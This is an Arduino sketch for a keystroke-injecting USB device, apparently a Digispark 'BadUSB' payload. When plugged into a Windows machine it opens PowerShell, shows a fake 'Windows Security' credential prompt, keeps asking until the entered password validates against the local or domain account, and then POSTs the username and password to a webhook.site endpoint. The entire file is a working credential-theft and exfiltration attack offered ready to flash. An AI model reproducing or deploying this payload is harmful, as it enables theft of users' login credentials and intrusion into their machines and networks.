#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.print("cmd"); //smallest window possible
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("{Start-Sleep -s 60;Add-Type -assemblyname system.DirectoryServices.accountmanagement;$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);$domainDN = \"LDAP://\" + ([ADSI]"").distinguishedName;while($true){$credential = $host.ui.PromptForCredential(\"Windows Security\", \"Enter your credentials\", \"\", \"\");if($credential){$creds = $credential.GetNetworkCredential();[String]$user = $creds.username;[String]$pass = $creds.password;[String]$domain = $creds.domain;$authlocal = $DS.ValidateCredentials($user, $pass);$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){$script:pastevalue = \"Username: \" + $user + \" Password: \" + $pass + \" Domain:\" + $domain + \" Domain:\"+ $authdomain.name;break}}};Invoke-WebRequest -Uri https://webhook.site/f9ad582c-881e-4da2-bc09-32c305d0f407 -Method POST -Body $pastevalue}"); //payload
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200); 
  for(;;)
  {
     //empty
    }
}
